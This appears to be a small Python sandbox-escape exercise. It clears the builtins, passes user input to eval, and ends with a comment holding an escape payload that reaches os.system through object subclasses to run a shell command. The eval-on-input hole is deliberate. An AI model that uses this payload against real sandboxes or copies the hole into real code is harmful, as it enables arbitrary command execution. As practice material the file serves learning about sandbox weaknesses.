backup_eval = eval
backup_input = input
backup_print = print

__builtins__.__dict__.clear()


def check_eval():
    a = backup_input('try os.system("cmd")!')
    try:
        backup_eval(a, {}, {})
        backup_print('SUCCESS!')
    except:
        backup_print('ERROR!')
        pass


check_eval()

# ''.__class__.__mro__[1].__subclasses__()[142].__init__.__globals__['system']('cmd')
